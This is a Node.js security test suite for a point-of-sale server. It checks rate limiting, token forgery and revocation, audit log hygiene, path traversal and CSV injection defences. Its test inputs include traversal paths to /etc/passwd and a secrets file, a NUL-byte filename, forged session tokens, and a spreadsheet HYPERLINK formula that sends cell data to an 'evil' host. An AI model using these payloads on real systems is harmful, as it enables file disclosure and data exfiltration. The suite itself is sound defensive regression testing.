'use strict';
// Security-specific probes: burst-login behavior, token forgery/epoch handling,
// audit hygiene (no passwords in the trail), and static-path traversal guards.
const test = require('node:test');
const assert = require('node:assert');
const crypto = require('node:crypto');
const fs = require('node:fs');
const http = require('node:http');
const path = require('node:path');
const os = require('node:os');

const { createApp } = require('../server/main');
const { Router, sendCSV } = require('../server/core/http');
const { clientIp } = require('../server/core/auth');

function tempDb() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'op-test-'));
  return path.join(dir, 'test.db');
}

async function startServer(opts) {
  const { server, db } = createApp(tempDb(), opts);
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const base = `http://127.0.0.1:${server.address().port}`;
  return { server, db, base };
}

// minimal cookie-carrying client
function client(base) {
  let cookie = '';
  return async (method, apiPath, body) => {
    const res = await fetch(base + apiPath, {
      method,
      headers: { 'content-type': 'application/json', cookie },
      body: body === undefined ? undefined : JSON.stringify(body),
    });
    const setCookie = res.headers.get('set-cookie');
    if (setCookie) cookie = setCookie.split(';')[0];
    let data = null;
    try { data = await res.json(); } catch { /* ignore */ }
    return { status: res.status, data };
  };
}

const SECRET = 'cd'.repeat(32);
const PROD_ENV = { OWLPOS_MODE: 'production', OWLPOS_SECRET: SECRET };

function sign(payload) {
  return `${payload}.${crypto.createHmac('sha256', SECRET).update(payload).digest('base64url')}`;
}

test('security: login burst — 429s before scrypt work, health stays responsive', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());

  const results = await Promise.all(
    Array.from({ length: 50 }, () =>
      fetch(base + '/api/auth/login', {
        method: 'POST', headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ username: 'admin', password: 'wrong' }),
      }).then((r) => r.status)
    )
  );
  const limited = results.filter((s) => s === 429).length;
  assert.ok(limited >= 20, `expected the limiter to shed most of the burst, got ${limited} 429s`);
  assert.ok(results.every((s) => s === 401 || s === 429), 'only 401/429 under burst');

  // event loop not wedged: health answers promptly after the burst
  const health = await fetch(base + '/api/health');
  assert.equal(health.status, 200);

  // rate-limited attempts never reached the DB; the ones that did are audited
  const failed = db.prepare("SELECT COUNT(*) n FROM audit_log WHERE action = 'auth.login_failed'").get().n;
  assert.ok(failed >= 1 && failed <= 50 - limited, 'audited failures = attempts that passed the limiter');
});

test('security: token forgery and epoch revocation', async (t) => {
  const { server, db, base } = await startServer({ env: PROD_ENV });
  t.after(() => server.close());
  const me = (cookie) => fetch(base + '/api/auth/me', { headers: { cookie } });
  const exp = Date.now() + 3600_000;
  const b64admin = Buffer.from('admin').toString('base64url');

  // correctly signed current-format token at the right epoch (0) authenticates
  const good = sign(`${b64admin}.0.${exp}`);
  assert.equal((await me(`opsid=${good}`)).status, 200);

  // legacy 3-part token — even correctly signed — fails closed
  const legacy = sign(`${b64admin}.${exp}`);
  assert.equal((await me(`opsid=${legacy}`)).status, 401);

  // correctly signed but wrong epoch → dead (epoch is enforced against the DB)
  assert.equal((await me(`opsid=${sign(`${b64admin}.999.${exp}`)}`)).status, 401);
  // non-integer epoch → dead
  assert.equal((await me(`opsid=${sign(`${b64admin}.x.${exp}`)}`)).status, 401);
  // tampered epoch without re-signing → signature check kills it
  const tampered = good.replace(`.0.`, `.1.`);
  assert.equal((await me(`opsid=${tampered}`)).status, 401);
  // expired
  assert.equal((await me(`opsid=${sign(`${b64admin}.0.${Date.now() - 1000}`)}`)).status, 401);

  // a direct epoch bump (what revoke-sessions does) kills the previously good token
  db.prepare("UPDATE users SET token_epoch = token_epoch + 1 WHERE username = 'admin'").run();
  assert.equal((await me(`opsid=${good}`)).status, 401);
  assert.equal((await me(`opsid=${sign(`${b64admin}.1.${exp}`)}`)).status, 200);
});

test('security: approver credentials never leak into the audit trail', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const cashier = client(base);
  await cashier('POST', '/api/auth/login', { username: 'cashier', password: 'cashier' });

  const { data: sell } = await cashier('GET', '/api/catalog/sellable?channel=pos');
  const adult = sell.products.find((p) => p.sku === 'ADULT');
  const order = (await cashier('POST', '/api/pos/orders', {
    lines: [{ product_id: adult.id, qty: 1 }],
  })).data.order;

  const probe = 'S3cret-Approval-Probe!';
  const deny = await cashier('POST', `/api/pos/orders/${order.id}/void`, {
    approver: { username: 'manager', password: probe },
  });
  assert.equal(deny.status, 403);
  const ok = await cashier('POST', `/api/pos/orders/${order.id}/void`, {
    approver: { username: 'manager', password: 'manager' },
  });
  assert.equal(ok.status, 200);

  for (const row of db.prepare('SELECT action, detail FROM audit_log').all()) {
    assert.ok(!(row.detail || '').includes(probe), `password leaked into ${row.action} detail`);
    assert.ok(!(row.detail || '').includes('"password"'), `password field in ${row.action} detail`);
  }
  const voidDetail = JSON.parse(
    db.prepare("SELECT detail FROM audit_log WHERE action = 'pos.order.void'").get().detail
  );
  assert.ok(voidDetail.approved_by > 0, 'void audit carries approved_by');
});

test('security: attempted usernames are truncated in the audit trail', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  // attackers paste passwords into the username field — cap what reaches the log
  const pasted = 'x'.repeat(200);
  await fetch(base + '/api/auth/login', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ username: pasted, password: 'x' }),
  });
  const row = db.prepare("SELECT detail FROM audit_log WHERE action = 'auth.login_failed'").get();
  assert.ok(JSON.parse(row.detail).username.length <= 64);
});

test('security: change-password shares the login throttle and lockout', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const cashier = client(base);
  await cashier('POST', '/api/auth/login', { username: 'cashier', password: 'cashier' });

  // a stolen cookie must not be an unthrottled password oracle: the login
  // already used one limiter slot, so the 20th probe overflows the window
  const statuses = [];
  let firstError = null;
  for (let i = 0; i < 20; i++) {
    const r = await cashier('POST', '/api/auth/change-password', {
      current_password: `wrong-${i}`, new_password: 'longenough-pass',
    });
    if (firstError === null) firstError = r.data.error;
    statuses.push(r.status);
  }
  assert.deepEqual(statuses.slice(0, 19), Array(19).fill(403));
  assert.equal(firstError, 'bad_current_password');
  assert.equal(statuses[19], 429);

  // wrong current passwords count toward the account lockout
  const row = db.prepare("SELECT locked_until FROM users WHERE username = 'cashier'").get();
  assert.ok(row.locked_until, 'repeated wrong current passwords lock the account');
});

test('security: approver probes are rate-limited per IP', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const cashier = client(base);
  await cashier('POST', '/api/auth/login', { username: 'cashier', password: 'cashier' });

  // unknown approver usernames never lock an account, so only the per-IP
  // limiter stands between a seller session and unbounded scrypt burn
  const statuses = [];
  for (let i = 0; i < 25; i++) {
    const r = await cashier('POST', '/api/pos/orders/999999/void', {
      approver: { username: `ghost-${i}`, password: 'nope' },
    });
    statuses.push(r.status);
  }
  assert.deepEqual(statuses.slice(0, 20), Array(20).fill(403));
  assert.deepEqual(statuses.slice(20), Array(5).fill(429));
  const locked = db.prepare('SELECT COUNT(*) n FROM users WHERE locked_until IS NOT NULL').get().n;
  assert.equal(locked, 0, 'unknown approver names must not lock real accounts');
});

test('security: static file traversal stays forbidden (regression guard)', async (t) => {
  const { server, base } = await startServer();
  t.after(() => server.close());
  // encoded slash defeats URL normalization; the server must still refuse
  const res = await fetch(base + '/..%2Fserver%2Fmain.js');
  assert.equal(res.status, 403);
  const res2 = await fetch(base + '/..%2F..%2Fetc%2Fpasswd');
  assert.equal(res2.status, 403);
});

test('security: malformed percent-escapes are a 400, never a process kill', async (t) => {
  const { server, base } = await startServer();
  t.after(() => server.close());
  // pre-fix: decodeURIComponent threw outside any try/catch, the dispatch
  // promise was discarded, and the unhandled rejection exited the process
  const bad = await fetch(base + '/%zz');
  assert.equal(bad.status, 400);
  assert.equal((await bad.json()).error, 'bad_request');
  const badApi = await fetch(base + '/api/%zz');
  assert.equal(badApi.status, 400);
  // a corrupt cookie must not fail the request either: it is treated as absent
  const badCookie = await fetch(base + '/api/health', { headers: { cookie: 'opsid=%zz' } });
  assert.equal(badCookie.status, 200);
  const meBadCookie = await fetch(base + '/api/auth/me', { headers: { cookie: 'opsid=%zz' } });
  assert.equal(meBadCookie.status, 401); // fails closed, not open
  // and the server answered all of that without dying
  assert.equal((await fetch(base + '/api/health')).status, 200);
});

test('security: static serving cannot escape into a sibling of webRoot', async (t) => {
  // /%2e%2e%2f survives WHATWG dot-segment normalization; a prefix-only
  // containment check then let it reach any sibling whose name starts with
  // the webRoot string (e.g. an operator's `cp -r web web.bak`)
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'op-web-'));
  fs.mkdirSync(path.join(dir, 'web'));
  fs.mkdirSync(path.join(dir, 'web.bak'));
  fs.writeFileSync(path.join(dir, 'web', 'index.html'), '<h1>ok</h1>');
  fs.writeFileSync(path.join(dir, 'web.bak', 'secrets.env'), 'OWLPOS_SECRET=deadbeef');
  const router = new Router({ webRoot: path.join(dir, 'web'), resolveUser: () => null });
  const server = http.createServer((req, res) => router.dispatch(req, res));
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  t.after(() => server.close());
  const base = `http://127.0.0.1:${server.address().port}`;

  assert.equal((await fetch(base + '/')).status, 200); // legit traffic unaffected
  const sibling = await fetch(base + '/%2e%2e%2fweb.bak%2fsecrets.env');
  assert.equal(sibling.status, 403, 'sibling of webRoot must be unreachable');
  const deep = await fetch(base + '/%2e%2e%2f%2e%2e%2fetc%2fpasswd');
  assert.equal(deep.status, 403);
  const nul = await fetch(base + '/index.html%00.png');
  assert.equal(nul.status, 403, 'NUL bytes must not reach fs.readFile');
});

test('security: sendCSV neutralises formula cells, keeps numbers readable', () => {
  let body = '';
  const res = { writeHead() { return this; }, end(b) { body = b; } };
  sendCSV(res, 'x.csv', [
    ['reason', 'amount'],
    ['=HYPERLINK("http://evil/"&A1,"x")', -1250],
    ['@SUM(1+1)*cmd', '-12.50'],
    ['+dial', '\tpayload'],
    ['-note', 'a,b'],
  ]);
  const lines = body.trim().split('\n');
  assert.equal(lines[1], `"'=HYPERLINK(""http://evil/""&A1,""x"")",-1250`);
  assert.equal(lines[2], `'@SUM(1+1)*cmd,-12.50`);
  assert.equal(lines[3], `'+dial,'\tpayload`);
  assert.equal(lines[4], `'-note,"a,b"`);
  // negative numbers — as numbers or preformatted strings — stay untouched
  assert.ok(lines[1].endsWith(',-1250'));
  assert.ok(lines[2].endsWith(',-12.50'));
});

test('security: X-Forwarded-For is ignored unless a trusted proxy is declared', () => {
  const req = (xff) => ({ socket: { remoteAddress: '10.0.0.1' }, headers: { 'x-forwarded-for': xff } });
  // default (no OWLPOS_TRUST_PROXY): the header is attacker-writable — ignore it
  assert.equal(clientIp(req('6.6.6.6'), false), '10.0.0.1');
  // opted in: the RIGHTMOST entry is the one the trusted proxy appended
  assert.equal(clientIp(req('6.6.6.6'), true), '6.6.6.6');
  assert.equal(clientIp(req('1.1.1.1, 2.2.2.2'), true), '2.2.2.2');
  // garbage or missing forwarded values fall back to the TCP peer
  assert.equal(clientIp(req('not-an-ip'), true), '10.0.0.1');
  assert.equal(clientIp({ socket: { remoteAddress: '10.0.0.1' }, headers: {} }, true), '10.0.0.1');
});

test('security: a garbage-username flood cannot 429 another account\'s login', async (t) => {
  const { server, base } = await startServer();
  t.after(() => server.close());
  const login = (username, password) => fetch(base + '/api/auth/login', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ username, password }),
  });
  // pre-fix the limiter keyed on the bare peer address, so 20 junk attempts
  // (one attacker, or every station behind one proxy) 429'd the whole venue
  for (let i = 0; i < 20; i++) assert.equal((await login('ghost', 'nope')).status, 401);
  assert.equal((await login('ghost', 'nope')).status, 429, 'the flooded account is throttled');
  const legit = await login('cashier', 'cashier');
  assert.equal(legit.status, 200, 'other accounts from the same address still sign in');
});

test('security: logout revokes the token — a captured cookie dies at sign-out', async (t) => {
  const { server, base } = await startServer();
  t.after(() => server.close());
  const login = await fetch(base + '/api/auth/login', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ username: 'admin', password: 'admin' }),
  });
  assert.equal(login.status, 200);
  const cookie = login.headers.get('set-cookie').split(';')[0];
  assert.equal((await fetch(base + '/api/auth/me', { headers: { cookie } })).status, 200);

  const out = await fetch(base + '/api/auth/logout', {
    method: 'POST', headers: { cookie, 'content-type': 'application/json' }, body: '{}',
  });
  assert.equal(out.status, 200);
  // replaying the captured token string after sign-out must fail: sessions are
  // stateless, so only the epoch bump — not the cleared browser cookie — kills it
  const replay = await fetch(base + '/api/auth/me', { headers: { cookie } });
  assert.equal(replay.status, 401);
});
